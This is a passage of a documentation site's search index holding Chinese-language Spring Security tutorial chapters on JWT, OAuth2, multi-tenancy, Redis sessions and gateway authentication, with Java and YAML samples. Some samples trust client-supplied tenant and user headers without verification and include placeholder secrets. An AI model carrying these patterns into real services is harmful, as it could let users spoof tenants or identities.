}\n}\n</code></pre>"},{"location":"auth/07-%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B%E9%9B%86/#_13","title":"\u5fae\u670d\u52a1\u914d\u7f6e","text":"<pre><code># \u5fae\u670d\u52a1application.yml\nspring:\n  security:\n    oauth2:\n      resourceserver:\n        jwt:\n          issuer-uri: http://auth-server:9000\n</code></pre>"},{"location":"auth/07-%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B%E9%9B%86/#_14","title":"\u670d\u52a1\u95f4\u8c03\u7528","text":"<pre><code>/**\n * \u670d\u52a1\u95f4\u8c03\u7528\uff08\u4f7f\u7528Feign + JWT\u4f20\u9012\uff09\n */\n@Component\npublic class JwtRequestInterceptor implements RequestInterceptor {\n\n    @Override\n    public void apply(RequestTemplate template) {\n        Authentication authentication = SecurityContextHolder.getContext().getAuthentication();\n\n        if (authentication != null &amp;&amp; authentication.getCredentials() instanceof Jwt) {\n            Jwt jwt = (Jwt) authentication.getCredentials();\n            template.header(\"Authorization\", \"Bearer \" + jwt.getTokenValue());\n        }\n    }\n}\n</code></pre>"},{"location":"auth/07-%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B%E9%9B%86/#_15","title":"\u524d\u540e\u7aef\u5206\u79bb\u8ba4\u8bc1\u65b9\u6848","text":"<p>\u5b8c\u6574\u7684\u524d\u540e\u7aef\u5206\u79bb\u65b9\u6848\u89c1 JWT Token\u5b9e\u73b0 \u7ae0\u8282\u3002</p>"},{"location":"auth/07-%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B%E9%9B%86/#_16","title":"\u603b\u7ed3","text":"<p>\u672c\u7ae0\u63d0\u4f9b\u4e86\u5b8c\u6574\u7684\u4ee3\u7801\u793a\u4f8b\uff1a</p> <ol> <li>\u57fa\u7840\u8ba4\u8bc1\uff1a\u7528\u6237\u540d\u5bc6\u7801\u3001Session\u7ba1\u7406</li> <li>JWT\u8ba4\u8bc1\uff1aToken\u751f\u6210\u3001\u9a8c\u8bc1\u3001\u5237\u65b0</li> <li>OAuth2\uff1a\u6388\u6743\u670d\u52a1\u5668\u3001\u8d44\u6e90\u670d\u52a1\u5668\u3001\u5ba2\u6237\u7aef</li> <li>\u5fae\u670d\u52a1\uff1a\u7f51\u5173\u8ba4\u8bc1\u3001\u670d\u52a1\u95f4\u8c03\u7528</li> <li>\u524d\u540e\u7aef\u5206\u79bb\uff1aToken\u5b58\u50a8\u3001\u81ea\u52a8\u5237\u65b0</li> </ol> <p>\u6e90\u7801\u5730\u5740\uff08\u53c2\u8003\uff09\uff1a - GitHub: spring-security-samples - Spring\u5b98\u65b9: Spring Security Reference</p> <p>\u7ee7\u7eed\u5b66\u4e60\uff1a - \u4e0a\u4e00\u7ae0\uff1aSpring Security OAuth2\u96c6\u6210 - \u4e0b\u4e00\u7ae0\uff1a\u9ad8\u7ea7\u4e3b\u9898\u4e0e\u6700\u4f73\u5b9e\u8df5</p>"},{"location":"auth/08-%E9%AB%98%E7%BA%A7%E4%B8%BB%E9%A2%98%E4%B8%8E%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/","title":"\u9ad8\u7ea7\u4e3b\u9898\u4e0e\u6700\u4f73\u5b9e\u8df5","text":""},{"location":"auth/08-%E9%AB%98%E7%BA%A7%E4%B8%BB%E9%A2%98%E4%B8%8E%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/#_2","title":"\u76ee\u5f55","text":"<ul> <li>\u591a\u79df\u6237\u8ba4\u8bc1</li> <li>\u5206\u5e03\u5f0f\u4f1a\u8bdd\u7ba1\u7406</li> <li>\u5fae\u670d\u52a1\u5b89\u5168\u67b6\u6784</li> <li>\u6027\u80fd\u4f18\u5316\u7b56\u7565</li> <li>\u5ba1\u8ba1\u65e5\u5fd7\u4e0e\u76d1\u63a7</li> <li>\u5b89\u5168\u6700\u4f73\u5b9e\u8df5\u6c47\u603b</li> </ul>"},{"location":"auth/08-%E9%AB%98%E7%BA%A7%E4%B8%BB%E9%A2%98%E4%B8%8E%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/#_3","title":"\u591a\u79df\u6237\u8ba4\u8bc1","text":""},{"location":"auth/08-%E9%AB%98%E7%BA%A7%E4%B8%BB%E9%A2%98%E4%B8%8E%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/#_4","title":"\u4ec0\u4e48\u662f\u591a\u79df\u6237\uff1f","text":"<p>\u591a\u79df\u6237\uff08Multi-Tenancy\uff09 \u662f\u4e00\u79cd\u8f6f\u4ef6\u67b6\u6784\uff0c\u5355\u4e2a\u5e94\u7528\u5b9e\u4f8b\u53ef\u4ee5\u670d\u52a1\u591a\u4e2a\u79df\u6237\uff08\u5ba2\u6237\uff09\uff0c\u6bcf\u4e2a\u79df\u6237\u7684\u6570\u636e\u76f8\u4e92\u9694\u79bb\u3002</p>"},{"location":"auth/08-%E9%AB%98%E7%BA%A7%E4%B8%BB%E9%A2%98%E4%B8%8E%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/#_5","title":"\u591a\u79df\u6237\u9694\u79bb\u7b56\u7565","text":"<ol> <li>\u6570\u636e\u5e93\u7ea7\u9694\u79bb\uff1a\u6bcf\u4e2a\u79df\u6237\u72ec\u7acb\u6570\u636e\u5e93</li> <li>Schema\u7ea7\u9694\u79bb\uff1a\u5171\u4eab\u6570\u636e\u5e93\uff0c\u72ec\u7acbSchema</li> <li>\u8868\u7ea7\u9694\u79bb\uff1a\u5171\u4eab\u8868\uff0c\u901a\u8fc7tenant_id\u5b57\u6bb5\u533a\u5206</li> </ol>"},{"location":"auth/08-%E9%AB%98%E7%BA%A7%E4%B8%BB%E9%A2%98%E4%B8%8E%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/#_6","title":"\u5b9e\u73b0\u591a\u79df\u6237\u8ba4\u8bc1","text":""},{"location":"auth/08-%E9%AB%98%E7%BA%A7%E4%B8%BB%E9%A2%98%E4%B8%8E%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/#1","title":"\u65b9\u5f0f1\uff1a\u57fa\u4e8e\u5b50\u57df\u540d","text":"<pre><code>tenant1.example.com \u2192 \u79df\u62371\ntenant2.example.com \u2192 \u79df\u62372\n</code></pre> <pre><code>/**\n * \u79df\u6237\u8bc6\u522b\u5668\n */\n@Component\npublic class TenantIdentifierResolver {\n\n    /**\n     * \u4ece\u8bf7\u6c42\u4e2d\u63d0\u53d6\u79df\u6237\u6807\u8bc6\n     */\n    public String resolveTenantIdentifier(HttpServletRequest request) {\n        // \u65b9\u5f0f1: \u4ece\u5b50\u57df\u540d\u63d0\u53d6\n        String host = request.getServerName();\n        if (host.contains(\".\")) {\n            String subdomain = host.substring(0, host.indexOf(\".\"));\n            if (!subdomain.equals(\"www\")) {\n                return subdomain;\n            }\n        }\n\n        // \u65b9\u5f0f2: \u4ece\u8bf7\u6c42\u5934\u63d0\u53d6\n        String tenantHeader = request.getHeader(\"X-Tenant-ID\");\n        if (tenantHeader != null) {\n            return tenantHeader;\n        }\n\n        // \u65b9\u5f0f3: \u4eceJWT Token\u63d0\u53d6\n        Authentication auth = SecurityContextHolder.getContext().getAuthentication();\n        if (auth != null &amp;&amp; auth.getCredentials() instanceof Jwt) {\n            Jwt jwt = (Jwt) auth.getCredentials();\n            return jwt.getClaimAsString(\"tenant_id\");\n        }\n\n        return \"default\";\n    }\n}\n</code></pre>"},{"location":"auth/08-%E9%AB%98%E7%BA%A7%E4%B8%BB%E9%A2%98%E4%B8%8E%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/#2jwt-token","title":"\u65b9\u5f0f2\uff1a\u57fa\u4e8eJWT Token","text":"<pre><code>/**\n * \u591a\u79df\u6237JWT Token Provider\n */\n@Component\npublic class MultiTenantJwtTokenProvider {\n\n    @Autowired\n    private TenantService tenantService;\n\n    /**\n     * \u751f\u6210\u5305\u542b\u79df\u6237\u4fe1\u606f\u7684Token\n     */\n    public String generateToken(Authentication authentication, String tenantId) {\n        UserDetails userDetails = (UserDetails) authentication.getPrincipal();\n\n        // \u9a8c\u8bc1\u7528\u6237\u662f\u5426\u5c5e\u4e8e\u8be5\u79df\u6237\n        if (!tenantService.userBelongsToTenant(userDetails.getUsername(), tenantId)) {\n            throw new IllegalArgumentException(\"User does not belong to tenant\");\n        }\n\n        Date now = new Date();\n        Date expiryDate = new Date(now.getTime() + 3600000);\n\n        return Jwts.builder()\n            .setSubject(userDetails.getUsername())\n            .claim(\"tenant_id\", tenantId)\n            .claim(\"tenant_name\", tenantService.getTenantName(tenantId))\n            .claim(\"authorities\", userDetails.getAuthorities())\n            .setIssuedAt(now)\n            .setExpiration(expiryDate)\n            .signWith(key, SignatureAlgorithm.HS512)\n            .compact();\n    }\n}\n</code></pre>"},{"location":"auth/08-%E9%AB%98%E7%BA%A7%E4%B8%BB%E9%A2%98%E4%B8%8E%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/#_7","title":"\u6570\u636e\u9694\u79bb","text":"<pre><code>/**\n * \u79df\u6237\u4e0a\u4e0b\u6587\n */\npublic class TenantContext {\n\n    private static final ThreadLocal&lt;String&gt; CURRENT_TENANT = new ThreadLocal&lt;&gt;();\n\n    public static void setTenantId(String tenantId) {\n        CURRENT_TENANT.set(tenantId);\n    }\n\n    public static String getTenantId() {\n        return CURRENT_TENANT.get();\n    }\n\n    public static void clear() {\n        CURRENT_TENANT.remove();\n    }\n}\n\n/**\n * \u79df\u6237\u8bc6\u522b\u8fc7\u6ee4\u5668\n */\n@Component\npublic class TenantIdentifierFilter extends OncePerRequestFilter {\n\n    @Autowired\n    private TenantIdentifierResolver tenantIdentifierResolver;\n\n    @Override\n    protected void doFilterInternal(HttpServletRequest request,\n                                   HttpServletResponse response,\n                                   FilterChain filterChain) \n            throws ServletException, IOException {\n\n        try {\n            String tenantId = tenantIdentifierResolver.resolveTenantIdentifier(request);\n            TenantContext.setTenantId(tenantId);\n            filterChain.doFilter(request, response);\n        } finally {\n            TenantContext.clear();\n        }\n    }\n}\n\n/**\n * JPA\u6570\u636e\u8fc7\u6ee4\n */\n@Entity\n@Table(name = \"orders\")\n@FilterDef(name = \"tenantFilter\", parameters = @ParamDef(name = \"tenantId\", type = \"string\"))\n@Filter(name = \"tenantFilter\", condition = \"tenant_id = :tenantId\")\npublic class Order {\n\n    @Id\n    @GeneratedValue(strategy = GenerationType.IDENTITY)\n    private Long id;\n\n    @Column(name = \"tenant_id\", nullable = false)\n    private String tenantId;\n\n    // \u5176\u4ed6\u5b57\u6bb5...\n}\n\n/**\n * \u81ea\u52a8\u8bbe\u7f6e\u79df\u6237ID\n */\n@Component\npublic class TenantEntityListener {\n\n    @PrePersist\n    public void setTenantId(Object entity) {\n        if (entity instanceof TenantAware) {\n            TenantAware tenantAware = (TenantAware) entity;\n            if (tenantAware.getTenantId() == null) {\n                tenantAware.setTenantId(TenantContext.getTenantId());\n            }\n        }\n    }\n}\n</code></pre>"},{"location":"auth/08-%E9%AB%98%E7%BA%A7%E4%B8%BB%E9%A2%98%E4%B8%8E%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/#_8","title":"\u5206\u5e03\u5f0f\u4f1a\u8bdd\u7ba1\u7406","text":""},{"location":"auth/08-%E9%AB%98%E7%BA%A7%E4%B8%BB%E9%A2%98%E4%B8%8E%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/#_9","title":"\u4e3a\u4ec0\u4e48\u9700\u8981\u5206\u5e03\u5f0f\u4f1a\u8bdd\uff1f","text":"<p>\u5728\u5fae\u670d\u52a1\u6216\u96c6\u7fa4\u73af\u5883\u4e2d\uff0c\u7528\u6237\u8bf7\u6c42\u53ef\u80fd\u88ab\u8def\u7531\u5230\u4e0d\u540c\u670d\u52a1\u5668\uff0c\u9700\u8981\u5171\u4eab\u4f1a\u8bdd\u6570\u636e\u3002</p>"},{"location":"auth/08-%E9%AB%98%E7%BA%A7%E4%B8%BB%E9%A2%98%E4%B8%8E%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/#_10","title":"\u89e3\u51b3\u65b9\u6848\u5bf9\u6bd4","text":"\u65b9\u6848 \u4f18\u70b9 \u7f3a\u70b9 \u9002\u7528\u573a\u666f Sticky Session \u7b80\u5355\uff0c\u65e0\u9700\u989d\u5916\u5b58\u50a8 \u5355\u70b9\u6545\u969c\uff0c\u8d1f\u8f7d\u4e0d\u5747 \u5c0f\u89c4\u6a21\u5e94\u7528 Session\u590d\u5236 \u9ad8\u53ef\u7528 \u7f51\u7edc\u5f00\u9500\u5927\uff0c\u4e0d\u9002\u5408\u5927\u96c6\u7fa4 \u4e2d\u5c0f\u89c4\u6a21 \u96c6\u4e2d\u5f0f\u5b58\u50a8 \u6269\u5c55\u6027\u597d\uff0c\u9ad8\u53ef\u7528 \u9700\u8981\u989d\u5916\u7ec4\u4ef6 \u5927\u89c4\u6a21\u751f\u4ea7\u73af\u5883 JWT Token \u65e0\u72b6\u6001\uff0c\u6613\u6269\u5c55 \u65e0\u6cd5\u4e3b\u52a8\u540a\u9500 \u5fae\u670d\u52a1\u3001API"},{"location":"auth/08-%E9%AB%98%E7%BA%A7%E4%B8%BB%E9%A2%98%E4%B8%8E%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/#redis","title":"\u4f7f\u7528Redis\u5b9e\u73b0\u5206\u5e03\u5f0f\u4f1a\u8bdd","text":""},{"location":"auth/08-%E9%AB%98%E7%BA%A7%E4%B8%BB%E9%A2%98%E4%B8%8E%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/#spring-session-redis","title":"Spring Session + Redis","text":"<pre><code>&lt;dependencies&gt;\n    &lt;dependency&gt;\n        &lt;groupId&gt;org.springframework.session&lt;/groupId&gt;\n        &lt;artifactId&gt;spring-session-data-redis&lt;/artifactId&gt;\n    &lt;/dependency&gt;\n    &lt;dependency&gt;\n        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n        &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;\n    &lt;/dependency&gt;\n&lt;/dependencies&gt;\n</code></pre> <pre><code>/**\n * Spring Session\u914d\u7f6e\n */\n@Configuration\n@EnableRedisHttpSession(maxInactiveIntervalInSeconds = 1800)  // 30\u5206\u949f\npublic class RedisSessionConfig {\n\n    @Bean\n    public LettuceConnectionFactory connectionFactory() {\n        RedisStandaloneConfiguration config = new RedisStandaloneConfiguration();\n        config.setHostName(\"localhost\");\n        config.setPort(6379);\n        config.setPassword(\"password\");\n\n        return new LettuceConnectionFactory(config);\n    }\n\n    /**\n     * Session\u5e8f\u5217\u5316\u5668\n     */\n    @Bean\n    public RedisSerializer&lt;Object&gt; springSessionDefaultRedisSerializer() {\n        return new GenericJackson2JsonRedisSerializer();\n    }\n\n    /**\n     * Cookie\u5e8f\u5217\u5316\u7b56\u7565\n     */\n    @Bean\n    public CookieSerializer cookieSerializer() {\n        DefaultCookieSerializer serializer = new DefaultCookieSerializer();\n        serializer.setCookieName(\"SESSIONID\");\n        serializer.setCookiePath(\"/\");\n        serializer.setDomainNamePattern(\"^.+?\\\\.(\\\\w+\\\\.[a-z]+)$\");  // \u8de8\u5b50\u57df\n        serializer.setUseHttpOnlyCookie(true);\n        serializer.setUseSecureCookie(true);\n        serializer.setSameSite(\"Lax\");\n        return serializer;\n    }\n}\n</code></pre> <pre><code># application.properties\nspring.redis.host=localhost\nspring.redis.port=6379\nspring.redis.password=\nspring.session.store-type=redis\nspring.session.redis.namespace=spring:session\n</code></pre>"},{"location":"auth/08-%E9%AB%98%E7%BA%A7%E4%B8%BB%E9%A2%98%E4%B8%8E%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/#session","title":"\u81ea\u5b9a\u4e49Session\u5b58\u50a8","text":"<pre><code>/**\n * \u81ea\u5b9a\u4e49Session Repository\n */\n@Component\npublic class CustomSessionRepository implements SessionRepository&lt;CustomSession&gt; {\n\n    @Autowired\n    private RedisTemplate&lt;String, Object&gt; redisTemplate;\n\n    private static final String SESSION_PREFIX = \"session:\";\n    private static final int DEFAULT_MAX_INACTIVE_INTERVAL = 1800;\n\n    @Override\n    public CustomSession createSession() {\n        CustomSession session = new CustomSession();\n        session.setId(UUID.randomUUID().toString());\n        session.setMaxInactiveInterval(Duration.ofSeconds(DEFAULT_MAX_INACTIVE_INTERVAL));\n        session.setCreationTime(Instant.now());\n        session.setLastAccessedTime(Instant.now());\n        return session;\n    }\n\n    @Override\n    public void save(CustomSession session) {\n        String key = SESSION_PREFIX + session.getId();\n        session.setLastAccessedTime(Instant.now());\n\n        redisTemplate.opsForHash().putAll(key, session.toMap());\n        redisTemplate.expire(key, session.getMaxInactiveInterval());\n    }\n\n    @Override\n    public CustomSession findById(String id) {\n        String key = SESSION_PREFIX + id;\n        Map&lt;Object, Object&gt; entries = redisTemplate.opsForHash().entries(key);\n\n        if (entries.isEmpty()) {\n            return null;\n        }\n\n        CustomSession session = CustomSession.fromMap(entries);\n\n        // \u68c0\u67e5\u662f\u5426\u8fc7\u671f\n        if (session.isExpired()) {\n            deleteById(id);\n            return null;\n        }\n\n        return session;\n    }\n\n    @Override\n    public void deleteById(String id) {\n        String key = SESSION_PREFIX + id;\n        redisTemplate.delete(key);\n    }\n}\n</code></pre>"},{"location":"auth/08-%E9%AB%98%E7%BA%A7%E4%B8%BB%E9%A2%98%E4%B8%8E%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/#session_1","title":"Session\u6d3b\u52a8\u76d1\u63a7","text":"<pre><code>/**\n * Session\u6d3b\u52a8\u76d1\u63a7\n */\n@Component\npublic class SessionActivityMonitor {\n\n    @Autowired\n    private SessionRegistry sessionRegistry;\n\n    /**\n     * \u83b7\u53d6\u6d3b\u8dc3\u4f1a\u8bdd\u6570\n     */\n    public int getActiveSessionCount() {\n        return sessionRegistry.getAllPrincipals().stream()\n            .mapToInt(principal -&gt; sessionRegistry.getAllSessions(principal, false).size())\n            .sum();\n    }\n\n    /**\n     * \u83b7\u53d6\u7528\u6237\u4f1a\u8bdd\n     */\n    public List&lt;SessionInfo&gt; getUserSessions(String username) {\n        List&lt;SessionInfo&gt; sessions = new ArrayList&lt;&gt;();\n\n        for (Object principal : sessionRegistry.getAllPrincipals()) {\n            if (principal.toString().equals(username)) {\n                List&lt;SessionInformation&gt; userSessions = \n                    sessionRegistry.getAllSessions(principal, false);\n\n                for (SessionInformation si : userSessions) {\n                    SessionInfo info = new SessionInfo();\n                    info.setSessionId(si.getSessionId());\n                    info.setLastRequest(si.getLastRequest());\n                    info.setExpired(si.isExpired());\n                    sessions.add(info);\n                }\n            }\n        }\n\n        return sessions;\n    }\n\n    /**\n     * \u5b9a\u671f\u6e05\u7406\u8fc7\u671f\u4f1a\u8bdd\n     */\n    @Scheduled(fixedRate = 60000)  // \u6bcf\u5206\u949f\n    public void cleanupExpiredSessions() {\n        for (Object principal : sessionRegistry.getAllPrincipals()) {\n            List&lt;SessionInformation&gt; sessions = \n                sessionRegistry.getAllSessions(principal, true);  // \u5305\u542b\u8fc7\u671f\n\n            for (SessionInformation si : sessions) {\n                if (si.isExpired()) {\n                    sessionRegistry.removeSessionInformation(si.getSessionId());\n                }\n            }\n        }\n    }\n}\n</code></pre>"},{"location":"auth/08-%E9%AB%98%E7%BA%A7%E4%B8%BB%E9%A2%98%E4%B8%8E%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/#_11","title":"\u5fae\u670d\u52a1\u5b89\u5168\u67b6\u6784","text":""},{"location":"auth/08-%E9%AB%98%E7%BA%A7%E4%B8%BB%E9%A2%98%E4%B8%8E%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/#_12","title":"\u67b6\u6784\u6a21\u5f0f","text":""},{"location":"auth/08-%E9%AB%98%E7%BA%A7%E4%B8%BB%E9%A2%98%E4%B8%8E%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/#1-gateway-authentication","title":"1. \u8fb9\u7f18\u8ba4\u8bc1\u6a21\u5f0f\uff08Gateway Authentication\uff09","text":"<pre><code>                          \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\nUser \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192  \u2502  API Gateway \u2502  \u2190 JWT\u9a8c\u8bc1\n                          \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                                 \u2502\n                    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n                    \u2502            \u2502            \u2502\n                \u250c\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2510    \u250c\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2510   \u250c\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2510\n                \u2502Service\u2502    \u2502Service\u2502   \u2502Service\u2502\n                \u2502   A   \u2502    \u2502   B   \u2502   \u2502   C   \u2502\n                \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>\u7279\u70b9\uff1a - \u8ba4\u8bc1\u5728\u7f51\u5173\u7edf\u4e00\u5904\u7406 - \u5185\u90e8\u670d\u52a1\u4fe1\u4efb\u7f51\u5173 - \u7b80\u5316\u670d\u52a1\u5f00\u53d1</p> <p>\u5b9e\u73b0\uff1a</p> <pre><code>/**\n * Gateway JWT\u8fc7\u6ee4\u5668\n */\n@Component\npublic class GatewayJwtFilter implements GlobalFilter, Ordered {\n\n    @Autowired\n    private JwtTokenProvider tokenProvider;\n\n    @Override\n    public Mono&lt;Void&gt; filter(ServerWebExchange exchange, GatewayFilterChain chain) {\n        ServerHttpRequest request = exchange.getRequest();\n\n        // \u516c\u5f00\u8def\u5f84\u8df3\u8fc7\u8ba4\u8bc1\n        if (isPublicPath(request.getPath().value())) {\n            return chain.filter(exchange);\n        }\n\n        // \u63d0\u53d6\u5e76\u9a8c\u8bc1JWT\n        String token = extractToken(request);\n        if (token == null || !tokenProvider.validateToken(token)) {\n            exchange.getResponse().setStatusCode(HttpStatus.UNAUTHORIZED);\n            return exchange.getResponse().setComplete();\n        }\n\n        // \u4eceToken\u63d0\u53d6\u7528\u6237\u4fe1\u606f\uff0c\u6dfb\u52a0\u5230\u8bf7\u6c42\u5934\u4f20\u9012\u7ed9\u540e\u7aef\u670d\u52a1\n        String username = tokenProvider.getUsernameFromToken(token);\n        String userId = tokenProvider.getClaimFromToken(token, \"user_id\");\n\n        ServerHttpRequest modifiedRequest = request.mutate()\n            .header(\"X-User-Id\", userId)\n            .header(\"X-Username\", username)\n            .build();\n\n        return chain.filter(exchange.mutate().request(modifiedRequest).build());\n    }\n\n    @Override\n    public int getOrder() {\n        return -100;  // \u9ad8\u4f18\u5148\u7ea7\n    }\n}\n\n/**\n * \u540e\u7aef\u670d\u52a1\u83b7\u53d6\u7528\u6237\u4fe1\u606f\n */\n@Component\npublic class UserContextInterceptor extends HandlerInterceptorAdapter {\n\n    @Override\n    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, \n                            Object handler) {\n        String userId = request.getHeader(\"X-User-Id\");\n        String username = request.getHeader(\"X-Username\");\n\n        // \u8bbe\u7f6e\u5230\u4e0a\u4e0b\u6587\n        UserContext.setUserId(userId);\n        UserContext.setUsername(username);\n\n        return true;\n    }\n\n    @Override\n    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, \n                               Object handler, Exception ex) {\n        UserContext.clear();\n    }\n}\n</code></pre>"},{"location":"auth/08-%E9%AB%98%E7%BA%A7%E4%B8%BB%E9%A2%98%E4%B8%8E%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/#2-service-to-service-authentication","title":"2. \u670d\u52a1\u95f4\u8ba4\u8bc1\u6a21\u5f0f\uff08Service-to-Service Authentication\uff09","text":"<pre><code>Service A \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192 Service B\n          Client Credentials\n          (OAuth2)\n</code></pre> <p>\u5b9e\u73b0\uff1a</p> <pre><code>/**\n * \u670d\u52a1\u95f4\u8c03\u7528\u5ba2\u6237\u7aef\n */\n@Configuration\npublic class ServiceClientConfig {\n\n    @Bean\n    @LoadBalanced\n    public RestTemplate restTemplate(OAuth2AuthorizedClientManager clientManager) {\n        RestTemplate restTemplate = new RestTemplate();\n\n        // \u6dfb\u52a0OAuth2\u62e6\u622a\u5668\n        restTemplate.getInterceptors().add((request, body, execution) -&gt; {\n            OAuth2AuthorizeRequest authorizeRequest = OAuth2AuthorizeRequest\n                .withClientRegistrationId(\"service-client\")\n                .principal(\"service-account\")\n                .build();\n\n            OAuth2AuthorizedClient client = clientManager.authorize(authorizeRequest);\n            if (client != null) {\n                request.getHeaders().setBearerAuth(\n                    client.getAccessToken().getTokenValue()\n                );\n            }\n\n            return execution.execute(request, body);\n        });\n\n        return restTemplate;\n    }\n\n    @Bean\n    public OAuth2AuthorizedClientManager authorizedClientManager(\n            ClientRegistrationRepository clientRegistrationRepository,\n            OAuth2AuthorizedClientRepository authorizedClientRepository) {\n\n        OAuth2AuthorizedClientProvider authorizedClientProvider =\n            OAuth2AuthorizedClientProviderBuilder.builder()\n                .clientCredentials()\n                .build();\n\n        DefaultOAuth2AuthorizedClientManager clientManager = \n            new DefaultOAuth2AuthorizedClientManager(\n                clientRegistrationRepository,\n                authorizedClientRepository\n            );\n\n        clientManager.setAuthorizedClientProvider(authorizedClientProvider);\n\n        return clientManager;\n    }\n}\n</code></pre> <pre><code># \u670d\u52a1\u914d\u7f6e\nspring:\n  security:\n    oauth2:\n      client:\n        registration:\n          service-client:\n            client-id: service-a\n            client-secret: service-a-secret\n            authorization-grant-type: client_credentials\n            scope: service.read,service.write\n        provider:\n          auth-server:\n            token-uri: http://auth-server:9000/oauth2/token\n</code></pre>"},{"location":"auth/08-%E9%AB%98%E7%BA%A7%E4%B8%BB%E9%A2%98%E4%B8%8E%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/#_13","title":"\u5206\u5e03\u5f0f\u8ffd\u8e2a\u4e0e\u5b89\u5168","text":"<pre><code>/**\n * \u5728\u5206\u5e03\u5f0f\u8ffd\u8e2a\u4e2d\u8bb0\u5f55\u5b89\u5168\u4fe1\u606f\n */\n@Component\npublic class SecurityTracingAspect {\n\n    @Autowired\n    private Tracer tracer;\n\n    @Around(\"@annotation(PreAuthorize)\")\n    public Object traceSecurityCheck(ProceedingJoinPoint joinPoint) throws Throwable {\n        Span span = tracer.currentSpan();\n\n        if (span != null) {\n            Authentication auth = SecurityContextHolder.getContext().getAuthentication();\n            if (auth != null) {\n                span.tag(\"security.user\", auth.getName());\n                span.tag(\"security.authorities\", \n                    auth.getAuthorities().stream()\n                        .map(GrantedAuthority::getAuthority)\n                        .collect(Collectors.joining(\",\")));\n            }\n        }\n\n        return joinPoint.proceed();\n    }\n}\n</code></pre>"},{"location":"auth/08-%E9%AB%98%E7%BA%A7%E4%B8%BB%E9%A2%98%E4%B8%8E%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/#_14","title":"\u6027\u80fd\u4f18\u5316\u7b56\u7565","text":""},{"location":"auth/08-%E9%AB%98%E7%BA%A7%E4%B8%BB%E9%A2%98%E4%B8%8E%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/#1_1","title":"1. \u7f13\u5b58\u8ba4\u8bc1\u4fe1\u606f","text":"<pre><code>/**\n * \u7f13\u5b58UserDetails\n */\n@Service\npublic class CachedUserDetailsService implements UserDetailsService {\n\n    @Autowired\n    private UserRepository userRepository;\n\n    @Cacheable(value = \"userDetails\", key = \"#username\")\n    @Override\n    public UserDetails loadUserByUsername(String username) {\n        User user = userRepository.findByUsername(username)\n            .orElseThrow(() -&gt; new UsernameNotFoundException(\"User not found\"));\n\n        return buildUserDetails(user);\n    }\n\n    @CacheEvict(value = \"userDetails\", key = \"#username\")\n    public void evictUserCache(String username) {\n        // \u7f13\u5b58\u5931\u6548\uff08\u7528\u6237\u4fe1\u606f\u66f4\u65b0\u65f6\u8c03\u7528\uff09\n    }\n}\n</code></pre>"},{"location":"auth/08-%E9%AB%98%E7%BA%A7%E4%B8%BB%E9%A2%98%E4%B8%8E%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/#2","title":"2. \u6279\u91cf\u6743\u9650\u68c0\u67e5","text":"<pre><code>/**\n * \u6279\u91cf\u6743\u9650\u68c0\u67e5\n */\n@Service\npublic class BatchAuthorizationService {\n\n    @Autowired\n    private PermissionRepository permissionRepository;\n\n    /**\n     * \u6279\u91cf\u68c0\u67e5\u6743\u9650\n     */\n    public Map&lt;String, Boolean&gt; checkPermissionsBatch(String userId, List&lt;String&gt; permissions) {\n        // \u4e00\u6b21\u67e5\u8be2\u83b7\u53d6\u7528\u6237\u6240\u6709\u6743\u9650\n        Set&lt;String&gt; userPermissions = permissionRepository.findByUserId(userId);\n\n        // \u6279\u91cf\u5224\u65ad\n        return permissions.stream()\n            .collect(Collectors.toMap(\n                permission -&gt; permission,\n                permission -&gt; userPermissions.contains(permission)\n            ));\n    